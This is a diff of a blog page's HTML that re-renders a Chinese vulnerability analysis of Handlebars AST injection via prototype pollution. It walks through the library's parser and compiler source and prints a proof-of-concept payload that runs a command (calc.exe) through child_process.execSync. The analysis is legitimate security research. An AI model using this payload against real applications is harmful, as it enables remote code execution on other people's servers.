@@ -5,19 +5,19 @@
 <meta property="og:site_name" content="Tyaoo&#39;s Blog">
 <meta property="og:description" content="详细分析Handlebars AST注入">
 <meta property="og:locale">
-<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
+<meta property="og:image" content="https://tyaoo.github.io/img/banner.jpg">
 <meta property="article:published_time" content="2021-09-25T08:34:23.000Z">
 <meta property="article:modified_time" content="2021-10-09T04:05:53.095Z">
 <meta property="article:author" content="Tyaoo">
 <meta property="article:tag" content="漏洞分析">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://tyaoo.github.io/2021/09/25/Handlebars-AST%E6%B3%A8%E5%85%A5/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+<meta name="twitter:image" content="https://tyaoo.github.io/img/banner.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://tyaoo.github.io/2021/09/25/Handlebars-AST%E6%B3%A8%E5%85%A5/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
   root: '/',
   algolia: undefined,
   localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
   translate: undefined,
   noticeOutdate: undefined,
-  highlight: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
   copy: {
     success: 'Copy successfully',
     error: 'Copy error',
@@ -143,7 +143,7 @@
     }
     detectApple()
     })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="Tyaoo's Blog" type="application/atom+xml">
-</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tyaoo's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Handlebars AST注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-09-25T08:34:23.000Z" title="Created 2021-09-25 16:34:23">2021-09-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-10-09T04:05:53.095Z" title="Updated 2021-10-09 12:05:53">2021-10-09</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Handlebars AST注入"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/banner.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tyaoo's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Handlebars AST注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-09-25T08:34:23.000Z" title="Created 2021-09-25 16:34:23">2021-09-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-10-09T04:05:53.095Z" title="Updated 2021-10-09 12:05:53">2021-10-09</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Handlebars AST注入"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
 <p>详细分析Handlebars AST注入</p>
 </blockquote>
 <span id="more"></span>
@@ -151,812 +151,116 @@
 <h3 id="原理图"><a href="#原理图" class="headerlink" title="原理图"></a>原理图</h3><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210925163678af9e286637ed6de903.png" alt="image-20210925022250921" style="zoom:80%;" />
 
 <p><code>handlebars</code>的<code>parser</code>在解析<code>NumberLiteral</code>类型的字符串时会使用<code>Number()</code>函数进行强制转换，正常情况下这个字符串只能数字，但是用过原型链污染我们可以构造一个非数字型的字符串</p>
-<pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\parser.js
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\parser.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">35</span>:</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$</span> = &#123; <span class="attr">type</span>: <span class="string">&#x27;StringLiteral&#x27;</span>, <span class="attr">value</span>: $$[$<span class="number">0</span>], <span class="attr">original</span>: $$[$<span class="number">0</span>], <span class="attr">loc</span>: yy.<span class="title function_">locInfo</span>(<span class="variable language_">this</span>.<span class="property">_$</span>) &#125;;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">36</span>:</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$</span> = &#123; <span class="attr">type</span>: <span class="string">&#x27;NumberLiteral&#x27;</span>, <span class="attr">value</span>: <span class="title class_">Number</span>($$[$<span class="number">0</span>]), <span class="attr">original</span>: <span class="title class_">Number</span>($$[$<span class="number">0</span>]), <span class="attr">loc</span>: yy.<span class="title function_">locInfo</span>(<span class="variable language_">this</span>.<span class="property">_$</span>) &#125;;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
 
-case 35:
-    this.$ = &#123; type: &#39;StringLiteral&#39;, value: $$[$0], original: $$[$0], loc: yy.locInfo(this._$) &#125;;
-    break;
-case 36:
-    this.$ = &#123; type: &#39;NumberLiteral&#39;, value: Number($$[$0]), original: Number($$[$0]), loc: yy.locInfo(this._$) &#125;;
-    break;</code></pre>
 <p>在将AST编译为函数时，<code>handlebars</code>用<code>pushString</code>将字符串传到<code>opcode</code>中，用<code>pushLiteral</code>将数字和布尔值传入到<code>opcode</code>中，而这个<code>opcode</code>就是之后用来构造模板函数的，<code>Literal</code>类型在AST中表示变量的意思，具体可以参考<a target="_blank" rel="noopener" href="https://docs.esprima.org/en/latest/syntax-tree-format.html">Esprima语法树标准</a>，所以我们下面我们能够利用的类型有<code>NumberLiteral</code>和<code>BooleanLiteral</code></p>
-<pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="title class_">StringLiteral</span>: <span class="keyword">function</span> <span class="title function_">StringLiteral</span>(<span class="params">string</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;pushString&#x27;</span>, string.<span class="property">value</span>); <span class="comment">// 字符串使用pushString</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="title class_">NumberLiteral</span>: <span class="keyword">function</span> <span class="title function_">NumberLiteral</span>(<span class="params">number</span>) &#123; </span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;pushLiteral&#x27;</span>, number.<span class="property">value</span>); <span class="comment">// 数字使用pushLiteral</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="title class_">BooleanLiteral</span>: <span class="keyword">function</span> <span class="title function_">BooleanLiteral</span>(<span class="params">bool</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;pushLiteral&#x27;</span>, bool.<span class="property">value</span>);  <span class="comment">// 布尔值使用pushLiteral</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="title class_">UndefinedLiteral</span>: <span class="keyword">function</span> <span class="title function_">UndefinedLiteral</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;pushLiteral&#x27;</span>, <span class="string">&#x27;undefined&#x27;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="attr">opcode</span>: <span class="keyword">function</span> <span class="title function_">opcode</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">opcodes</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">      <span class="attr">opcode</span>: name,</span><br><span class="line">      <span class="attr">args</span>: slice.<span class="title function_">call</span>(<span class="variable language_">arguments</span>, <span class="number">1</span>),</span><br><span class="line">      <span class="attr">loc</span>: <span class="variable language_">this</span>.<span class="property">sourceNode</span>[<span class="number">0</span>].<span class="property">loc</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>
 
-  StringLiteral: function StringLiteral(string) &#123;
-    this.opcode(&#39;pushString&#39;, string.value); // 字符串使用pushString
-  &#125;,
-
-  NumberLiteral: function NumberLiteral(number) &#123; 
-    this.opcode(&#39;pushLiteral&#39;, number.value); // 数字使用pushLiteral
-  &#125;,
-
-  BooleanLiteral: function BooleanLiteral(bool) &#123;
-    this.opcode(&#39;pushLiteral&#39;, bool.value);  // 布尔值使用pushLiteral
-  &#125;,
-
-  UndefinedLiteral: function UndefinedLiteral() &#123;
-    this.opcode(&#39;pushLiteral&#39;, &#39;undefined&#39;);
-  &#125;,
-
-  opcode: function opcode(name) &#123;
-    this.opcodes.push(&#123;
-      opcode: name,
-      args: slice.call(arguments, 1),
-      loc: this.sourceNode[0].loc
-    &#125;);
-  &#125;,</code></pre>
 <p>那么我们如何调用这些函数呢，<code>handlebars</code>在编译语法树时会调用一个叫<code>accept</code>的函数来处理我们的语法树节点，他会调用<code>node.type</code>对应的构造函数来修改<code>opcode</code>，所以我们的重点也可以转换成如何控制<code>accept(node)</code>中<code>node</code>值，且保证解析流程正常进行</p>
-<pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js</span></span><br><span class="line">  </span><br><span class="line">  <span class="attr">accept</span>: <span class="keyword">function</span> <span class="title function_">accept</span>(<span class="params">node</span>) &#123;</span><br><span class="line">    <span class="comment">/* istanbul ignore next: Sanity code */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">this</span>[node.<span class="property">type</span>]) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> _exception2[<span class="string">&#x27;default&#x27;</span>](<span class="string">&#x27;Unknown type: &#x27;</span> + node.<span class="property">type</span>, node);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">sourceNode</span>.<span class="title function_">unshift</span>(node);</span><br><span class="line">    <span class="keyword">var</span> ret = <span class="variable language_">this</span>[node.<span class="property">type</span>](node); <span class="comment">// 调用node.type对应的构造函数</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">sourceNode</span>.<span class="title function_">shift</span>();</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>
 
-  accept: function accept(node) &#123;
-    /* istanbul ignore next: Sanity code */
-    if (!this[node.type]) &#123;
-      throw new _exception2[&#39;default&#39;](&#39;Unknown type: &#39; + node.type, node);
-    &#125;
 
-    this.sourceNode.unshift(node);
-    var ret = this[node.type](node); // 调用node.type对应的构造函数
-    this.sourceNode.shift();
-    return ret;
-  &#125;,</code></pre>
+
 <h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><blockquote>
 <p>原文作者采用的payload</p>
 </blockquote>
-<pre><code class="java">const Handlebars = require(&#39;handlebars&#39;);
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="variable">Handlebars</span> <span class="operator">=</span> require(<span class="string">&#x27;handlebars&#x27;</span>);</span><br><span class="line"></span><br><span class="line">Object.prototype.type = <span class="string">&#x27;Program&#x27;</span>;</span><br><span class="line">Object.prototype.body = [&#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;MustacheStatement&quot;</span>,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;params&quot;</span>: [&#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;NumberLiteral&quot;</span>,</span><br><span class="line">        <span class="string">&quot;value&quot;</span>: <span class="string">&quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc.exe&#x27;).toString())&quot;</span></span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="string">&quot;loc&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;start&quot;</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">var</span> <span class="variable">source</span> <span class="operator">=</span> <span class="string">&quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="type">var</span> <span class="variable">template</span> <span class="operator">=</span> Handlebars.compile(source);</span><br><span class="line">console.log(template(&#123;&#125;));</span><br></pre></td></tr></table></figure>
 
-Object.prototype.type = &#39;Program&#39;;
-Object.prototype.body = [&#123;
-    &quot;type&quot;: &quot;MustacheStatement&quot;,
-    &quot;path&quot;: 0,
-    &quot;params&quot;: [&#123;
-        &quot;type&quot;: &quot;NumberLiteral&quot;,
-        &quot;value&quot;: &quot;console.log(process.mainModule.require(&#39;child_process&#39;).execSync(&#39;calc.exe&#39;).toString())&quot;
-    &#125;],
-    &quot;loc&quot;: &#123;
-        &quot;start&quot;: 0
-    &#125;
-&#125;];
-
-
-var source = &quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;;
-var template = Handlebars.compile(source);
-console.log(template(&#123;&#125;));</code></pre>
 <p>大概流程：</p>
 <ol>
 <li>将<code>type</code>修改为<code>Program</code>绕过<code>Lexer</code>解析</li>
 <li>污染<code>Program</code>中的<code>body</code>，注入自定义的<code>AST</code></li>
 <li>在<code>compiler.js</code>文件中找到可用<code>Gadget</code>，此<code>Gadget</code>能够控制<code>accept(node)</code>中<code>node</code>值，原文作者利用的是<code>MustacheStatement</code></li>
 </ol>
-<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h4><pre><code class="js">compiler.js/ret()
-    compiler.js/compileInput()
-        base.js/parse()
-            base.js/parseWithoutProcessing()
-            visitor.js/accept()
-        compiler.js/compile()
-            compiler.js/accept()
-                compiler.js/Program()
-                    compiler.js/MustacheStatement()
-                        compiler.js/NumberLiteral() &lt;-- 注入payload
-        javascript-compiler.js/compile()
-            javascript-compiler.js/createFunctionContext &lt;-- 生成模板函数体
-        handlebars.runtime.js/create()
-    runtime.js/ret()
-        runtime.js/executeDecorators()
-        anonymous/templateSpec.main()</code></pre>
-<h4 id="解析入口"><a href="#解析入口" class="headerlink" title="解析入口"></a>解析入口</h4><pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">compiler.<span class="property">js</span>/<span class="title function_">ret</span>()</span><br><span class="line">    compiler.<span class="property">js</span>/<span class="title function_">compileInput</span>()</span><br><span class="line">        base.<span class="property">js</span>/<span class="title function_">parse</span>()</span><br><span class="line">            base.<span class="property">js</span>/<span class="title function_">parseWithoutProcessing</span>()</span><br><span class="line">            visitor.<span class="property">js</span>/<span class="title function_">accept</span>()</span><br><span class="line">        compiler.<span class="property">js</span>/<span class="title function_">compile</span>()</span><br><span class="line">            compiler.<span class="property">js</span>/<span class="title function_">accept</span>()</span><br><span class="line">                compiler.<span class="property">js</span>/<span class="title class_">Program</span>()</span><br><span class="line">                    compiler.<span class="property">js</span>/<span class="title class_">MustacheStatement</span>()</span><br><span class="line">                        compiler.<span class="property">js</span>/<span class="title class_">NumberLiteral</span>() &lt;-- 注入payload</span><br><span class="line">        javascript-compiler.<span class="property">js</span>/<span class="title function_">compile</span>()</span><br><span class="line">            javascript-compiler.<span class="property">js</span>/createFunctionContext &lt;-- 生成模板函数体</span><br><span class="line">        handlebars.<span class="property">runtime</span>.<span class="property">js</span>/<span class="title function_">create</span>()</span><br><span class="line">    runtime.<span class="property">js</span>/<span class="title function_">ret</span>()</span><br><span class="line">        runtime.<span class="property">js</span>/<span class="title function_">executeDecorators</span>()</span><br><span class="line">        anonymous/templateSpec.<span class="title function_">main</span>()</span><br></pre></td></tr></table></figure>
 
-  function ret(context, execOptions) &#123;
-    if (!compiled) &#123;
-      compiled = compileInput(); // 编译输入
-    &#125;
-    return compiled.call(this, context, execOptions);
-  &#125;</code></pre>
-<h4 id="解析AST"><a href="#解析AST" class="headerlink" title="解析AST"></a>解析AST</h4><pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js
+<h4 id="解析入口"><a href="#解析入口" class="headerlink" title="解析入口"></a>解析入口</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">ret</span>(<span class="params">context, execOptions</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!compiled) &#123;</span><br><span class="line">      compiled = <span class="title function_">compileInput</span>(); <span class="comment">// 编译输入</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> compiled.<span class="title function_">call</span>(<span class="variable language_">this</span>, context, execOptions);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
 
-  function compileInput() &#123;
-    var ast = env.parse(input, options), // 获取语法树
-        environment = new env.Compiler().compile(ast, options), 
-        templateSpec = new env.JavaScriptCompiler().compile(environment, options, undefined, true);
-    return env.template(templateSpec);
-  &#125;</code></pre>
+<h4 id="解析AST"><a href="#解析AST" class="headerlink" title="解析AST"></a>解析AST</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">compileInput</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> ast = env.<span class="title function_">parse</span>(input, options), <span class="comment">// 获取语法树</span></span><br><span class="line">        environment = <span class="keyword">new</span> env.<span class="title class_">Compiler</span>().<span class="title function_">compile</span>(ast, options), </span><br><span class="line">        templateSpec = <span class="keyword">new</span> env.<span class="title class_">JavaScriptCompiler</span>().<span class="title function_">compile</span>(environment, options, <span class="literal">undefined</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> env.<span class="title function_">template</span>(templateSpec);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
 <p>语法树解析</p>
-<pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\base.js
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\base.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">parse</span>(<span class="params">input, options</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> ast = <span class="title function_">parseWithoutProcessing</span>(input, options); <span class="comment">// 转化为AST</span></span><br><span class="line">  <span class="keyword">var</span> strip = <span class="keyword">new</span> _whitespaceControl2[<span class="string">&#x27;default&#x27;</span>](options);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> strip.<span class="title function_">accept</span>(ast); <span class="comment">// 解析AST</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-function parse(input, options) &#123;
-  var ast = parseWithoutProcessing(input, options); // 转化为AST
-  var strip = new _whitespaceControl2[&#39;default&#39;](options);
-
-  return strip.accept(ast); // 解析AST
-&#125;</code></pre>
 <p>这里的重点是将<code>input.type</code>污染为<code>Program</code>，从而绕过AST的转换阶段</p>
-<pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\base.js
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\base.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">parseWithoutProcessing</span>(<span class="params">input, options</span>) &#123;</span><br><span class="line">  <span class="comment">// Just return if an already-compiled AST was passed in.</span></span><br><span class="line">  <span class="keyword">if</span> (input.<span class="property">type</span> === <span class="string">&#x27;Program&#x27;</span>) &#123; <span class="comment">// 如果已经是转换好的AST就直接返回</span></span><br><span class="line">    <span class="keyword">return</span> input;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  _parser2[<span class="string">&#x27;default&#x27;</span>].<span class="property">yy</span> = yy;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Altering the shared object here, but this is ok as parser is a sync operation</span></span><br><span class="line">  yy.<span class="property">locInfo</span> = <span class="keyword">function</span> (<span class="params">locInfo</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> yy.<span class="title class_">SourceLocation</span>(options &amp;&amp; options.<span class="property">srcName</span>, locInfo);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> ast = _parser2[<span class="string">&#x27;default&#x27;</span>].<span class="title function_">parse</span>(input); <span class="comment">// 否则就调用Lexer解析节点生成AST</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ast;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-function parseWithoutProcessing(input, options) &#123;
-  // Just return if an already-compiled AST was passed in.
-  if (input.type === &#39;Program&#39;) &#123; // 如果已经是转换好的AST就直接返回
-    return input;
-  &#125;
-
-  _parser2[&#39;default&#39;].yy = yy;
-
-  // Altering the shared object here, but this is ok as parser is a sync operation
-  yy.locInfo = function (locInfo) &#123;
-    return new yy.SourceLocation(options &amp;&amp; options.srcName, locInfo);
-  &#125;;
-
-  var ast = _parser2[&#39;default&#39;].parse(input); // 否则就调用Lexer解析节点生成AST
-
-  return ast;
-&#125;</code></pre>
 <p>这里是递归解析语法树</p>
-<pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\visitor.js
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\visitor.js</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">accept</span>: <span class="keyword">function</span> <span class="title function_">accept</span>(<span class="params">object</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!object) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* istanbul ignore next: Sanity code */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">this</span>[object.<span class="property">type</span>]) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> _exception2[<span class="string">&#x27;default&#x27;</span>](<span class="string">&#x27;Unknown type: &#x27;</span> + object.<span class="property">type</span>, object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">current</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">parents</span>.<span class="title function_">unshift</span>(<span class="variable language_">this</span>.<span class="property">current</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">current</span> = object;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> ret = <span class="variable language_">this</span>[object.<span class="property">type</span>](object); <span class="comment">// 调用对应的构造函数解析AST</span></span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">current</span> = <span class="variable language_">this</span>.<span class="property">parents</span>.<span class="title function_">shift</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">mutating</span> || ret) &#123;</span><br><span class="line">      <span class="keyword">return</span> ret;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ret !== <span class="literal">false</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>
 
-  accept: function accept(object) &#123;
-    if (!object) &#123;
-      return;
-    &#125;
+<h4 id="编译环境变量"><a href="#编译环境变量" class="headerlink" title="编译环境变量"></a>编译环境变量</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">compileInput</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> ast = env.<span class="title function_">parse</span>(input, options), </span><br><span class="line">        environment = <span class="keyword">new</span> env.<span class="title class_">Compiler</span>().<span class="title function_">compile</span>(ast, options), <span class="comment">// 编译环境变量</span></span><br><span class="line">        templateSpec = <span class="keyword">new</span> env.<span class="title class_">JavaScriptCompiler</span>().<span class="title function_">compile</span>(environment, options, <span class="literal">undefined</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> env.<span class="title function_">template</span>(templateSpec);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
 
-    /* istanbul ignore next: Sanity code */
-    if (!this[object.type]) &#123;
-      throw new _exception2[&#39;default&#39;](&#39;Unknown type: &#39; + object.type, object);
-    &#125;
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">compile</span>: <span class="keyword">function</span> <span class="title function_">compile</span>(<span class="params">program, options</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">sourceNode</span> = [];</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">opcodes</span> = [];</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">children</span> = [];</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">options</span> = options;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">stringParams</span> = options.<span class="property">stringParams</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">trackIds</span> = options.<span class="property">trackIds</span>;</span><br><span class="line"></span><br><span class="line">    options.<span class="property">blockParams</span> = options.<span 